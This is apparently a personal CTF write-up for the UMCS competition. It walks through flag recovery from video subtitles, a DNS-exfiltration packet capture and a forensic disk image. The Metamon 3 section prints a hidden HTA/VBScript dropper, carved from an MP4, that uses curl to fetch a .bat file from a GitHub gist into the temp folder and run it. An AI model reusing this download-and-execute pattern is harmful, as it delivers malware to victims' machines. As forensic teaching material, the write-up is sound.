---
title: UMCS 
date: 2026-04-26 00:00:00 +0800
categories: [ctf]
tags: [blueteam]     # TAG names should always be lowercase
description: UMCS CTF
image: assets/posts/2026-04-26-UMCS Lab/umcs.png
---

## Misc

### Noise Penguin
The given video file is Noisy_Penguins.mkv. It is just a simple pingu meme video. I used ExifTool and Binwalk, but they didn’t reveal anything. So, I turned to a more commonly used tool, ffmpeg.

```bash
└─$ ffprobe Noisy_Penguins.mkv
```
![Desktop View](/assets/posts/2026-04-26-UMCS Lab/pingu.png){: width="472" height="389" .rounded-10  }

N

```bash
ffmpeg -dump_attachment:t "" -i Noisy_Penguins.mkv
```

This command will automatically extract all attachment and save them using their original filenames. 
Now we have the video and it just plays the video


The extracted video plays normally with no noticeable anomalies. I then re-examined the file to identify any potentially interesting artifacts and I found this.


![Desktop View](/assets/posts/2026-04-26-UMCS Lab/subtitile.png){: width="472" height="389" .rounded-10  }

Upon reviewing the video, no subtitles were visible during playback. However, the output indicated the presence of a subtitle track. Therefore, I proceeded to examine the subtitle track in more detail using this command.


```bash
ffmpeg -y -i PINGU.mp4 -map 0:2 -c:s text

 # The output
1
00:00:30,000 --> 00:00:32,000
VU1DU3thc2

2
00:01:05,000 --> 00:01:07,000
RkFLRV9GbEFn

3
00:01:48,000 --> 00:01:50,000
MxMV9wM25H

4
00:02:09,000 --> 00:02:11,000
dTFuX24wMHR9

5
00:02:20,000 --> 00:02:22,000
TmV2ZXJHb25uYUdpdmVZb3VVcA==
```

The output shows base64 encoded strings. I decoded the strings and got this

```bash
└─$ echo "VU1DU3thc2RkFLRV9GbEFnMxMV9wM25HdTFuX24wMHR9TmV2ZXJHb25uYUdpdmVZb3VVcA==" | base64 -d
UMCS{asdd�U�f�s11_p3nGu1n_n00t}NeverGonnaGiveYouUp
```
This appears to be a fake flag. I spent about an hour searching for another flag before figuring this out. I then attempted to decode the strings one by one.

```bash
└─$ echo "RkFLRV9GbEFn" | base64 -d
FAKE_FlAg
```

> Base64 requires 4-character alignment. Every group of 4 base64 characters decodes to exactly 3 bytes.

And chunk 2 has 12 chars which aligns perfectly on its own. Inserting this chunk 2 into the join corrupts all the 4-char block boundaries creates garbage output. If we try to decode a 10-character string alone, the last 2 characters are a dangling partial block which means they can't decode to anything meaningful on their own.


| VU1DU3thc2         | RkFLRV9GbEFn              |         MxMV9wM25H | dTFuX24wMHR9       |
| :----------------- | :------------------------ | -----------------: |
| chunk 1 (10 chars) | chunk 2 — FAKE (12 chars) | chunk 3 (10 chars) | chunk 4 (12 chars) |

Final decoded strings: 

```bash
└─$ echo "VU1DU3thc2MxMV9wM25HdTFuX24wMHR9" |base64 -d
UMCS{asc11_p3nGu1n_n00t}
```
Flag:` UMCS{asc11_p3nGu1n_n00t}`

## Fwn 
### Shadow_Ops

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/shadow ops.png){: width="572" height="89" .rounded-10  }

Upon opening the packet capture, I observed a high volume of DNS queries. To uncover the hidden message, I needed to distinguish it from legitimate traffic. The technique used is a classic example of DNS exfiltration, where data is smuggled out of a network by embedding it within DNS queries.

Traffic to tracking-data.net contains Base64-encoded subdomains. When decoded, these reveal strings such as `c29tZSBub2lzZSBkYXRh` (“some noise data”) and `bm90aGluZyB0byBzZWUgaGVyZQ==` (“nothing to see here”).
![Desktop View](/assets/posts/2026-04-26-UMCS Lab/shadow ops2.png){: width="572" height="89" .rounded-10  }


The Signal: Queries to `metrics-update.net` stand out. The subdomains are long, seemingly random strings of characters, and each query is followed by a single character at the end of the subdomain

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/shadow ops3.png){: width="572" height="89" .rounded-10  }


By filtering the traffic for the domain metrics-update.net, we can extract the unique subdomains. The single-character suffixes (e through n) act as an index or sequence number, telling us the correct order to piece the data back together.

| Index | Subdomain Chunk |
| :---- | :-------------- |
| e     | d6fqqcdnbs      |
| f     | 2gsaadmrqx      |
| g     | iyiabp2xkd      |
| h     | voj3esxdsp      |
| i     | fnfezt2nzu      |
| j     | vuslgjzthy      |
| k     | wl6ojbgmsl      |
| l     | 4pz4xsrlqf      |
| m     | achwodurei      |
| n     | aaaaa=          |

Reassembled String: `D6FQQCDNBS2GSAADMRQXIYIABP2XKDVOJ3ESXDSPFNFEZT2NZUVUSLGJZTHYWL6OJBGMSL4PZ4XSRLQFACHWODUREIAAAAA=`

```bash
└─$ echo "D6FQQCDNBS2GSAADMRQXIYIABP2XKDVOJ3ESXDSPFNFEZT2NZUVUSLGJZTHYWL6OJBGMSL4PZ4XSRLQFACHWODUREI" | base32 -d
m
 �idata
       �u�N�+�O+JL�M�+I,��ϋ/�HL�/��/(��g�"
```
As you can see the decoded shows garbage output and it’s ahrd to determine what’s the inside. Instead, I decode this string using exactly 60 bytes of data. Inspecting `1f 8b` reveals the magic number of GZIP compressed file.

```bash 
└─$ python3
Python 3.13.12 (main, Feb  4 2026, 15:06:39) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> data = base64.b32decode("D6FQQCDNBS2GSAADMRQXIYIABP2XKDVOJ3ESXDSPFNFEZT2NZUVUSLGJZTHYWL6OJBGMSL4PZ4XSRLQFACHWODUREI\
AAAAA=")
...
>>> print(data[:20])
b'\x1f\x8b\x08\x08m\x0c\xb4i\x00\x03data\x00\x0b\xf5u\x0e\xae'
```
Using this script, I was able to decompress the file and retrieve the flag

```bash 
import base64
import gzip
 
data = base64.b32decode(
    "D6FQQCDNBS2GSAADMRQXIYIABP2XKDVOJ3ESXDSPFNFEZT2NZUVUSLGJZTHYWL6"
    "OJBGMSL4PZ4XSRLQFACHWODUREI AAAAA=".replace(" ", "")
)
 
print(f"[*] Decoded {len(data)} bytes")
print(f"[*] Magic bytes: {data[:4].hex()}")
 
decompressed = gzip.decompress(data)
print(f"[*] Decompressed {len(decompressed)} bytes")
print(f"[+] Result: {decompressed.decode(errors='replace')}")


\EDITOR\UMSCTF> python3 .\Shadow_ops.py
[*] Decoded 59 bytes
[*] Magic bytes: 1f8b0808
[*] Decompressed 34 bytes
[+] Result: UMCS{dns_fragmentation_shadow_ops}
```
Flag: `UMCS{dns_fragmentation_shadow_ops`


## DFIR

### Metamon 1

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/metamon11.png){: width="572" height="89" .rounded-10  }

The flag was found in `C:\Users [AD1]/ahmad/Desktop/README.txt` after you decoded it when you opened the file using FTK Imager.

```bash
└─$ echo "VU1DU3szel9mMXJzN19nbGFmXzR0X3I0bnNvbV9uMFQzfQ==" | base64 -d
UMCS{3z_f1rs7_glaf_4t_r4nsom_n0T3}
```
### Metamon 2


To review Ahmad’s previously visited links, I examined the browser history stored on the system. For Microsoft Edge, the history database is located at:
`C:\Users\[AD1]\ahmad\AppData\Local\Microsoft\Edge\User Data\Default\History`

For Google Chrome, the history file is typically found at:
`C:\Users\[AD1]\ahmad\AppData\Local\Google\Chrome\User Data\Default\History`

For Mozilla Firefox, browsing history is stored within the user profile directory, usually located at:
`C:\Users\[AD1]\ahmad\AppData\Roaming\Mozilla\Firefox\Profiles\<profile-folder>\places.sqlite`

These files contain records of visited websites and can be analyzed to reconstruct browsing activity.

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/metamon12.png){: width="572" height="89" .rounded-10  }

The history log is stored in SQLite format. Therefore, I used an online SQLite viewer to open the database and examine the recorded visited URLs.

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/metamon21.png){: width="572" height="89" .rounded-10  }

and the flag is the flag is `UMCS{https://pinarat.github.io/a/}`

### Metamon 3

Let’s navigate to the link. Try to follow their instruction but make sure not to run it unless you’re using virtual machine or protected one. 

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/metamon31.png){: width="572" height="89" .rounded-10  }

As observed, the link appears in the Run command history. I then proceeded to access that link.



![Desktop View](/assets/posts/2026-04-26-UMCS Lab/metamon32.png){: width="572" height="89" .rounded-10  }

The video seems suspicious, as it is unusual for it to contain only a single media file. Therefore, I downloaded it to further analyze whether any hidden data might be embedded within the video. So I used binwalk to investigate the file

```bash
└─$ binwalk b.mp4

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
147994        0x2421A         JBOOT STAG header, image id: 11, timestamp 0x502C657E, image size: 4292980418 bytes, image JBOOT checksum: 0xE4C3, header JBOOT checksum: 0x9235
4172063       0x3FA91F        HTML document header
4172484       0x3FAAC4        HTML document footer

```
Since we can’t use the extractor so i will use this command and read the file

```bash
dd if=b.mp4 bs=1 skip=4172063 count=$((4172484-4172063)) of=hidden.html

└─$ cat hidden.html
<html>
<head>
<HTA:APPLICATION ID="o" APPLICATIONNAME="v" SHOWINTASKBAR="no" WINDOWSTATE="minimize">
</head>
<body>
<script language="VBScript">
Set s = CreateObject("WScript.Shell")
s.Run "cmd /c curl -L -o %temp%\rizzler.bat ""https://gist.githubusercontent.com/pinarat/c91018d3da6aab0ee2936dff7c02b7f2/raw/be430144cf9cc43d0bc8b2f7d23e45f155660232/rizzler.bat"" & %temp%\rizzler.bat", 1, False
Close
</script>
</body>
```
This is not a normal HTML web centent. It is designed to execute code in Windows. This script downloads a .bat file from the internet, then saves it in the system temp directory to execute it automatically. Lets go to the link. 

![Desktop View](/assets/posts/2026-04-26-UMCS Lab/metamon33.png){: width="572" height="89" .rounded-10  }

and we found the flag!

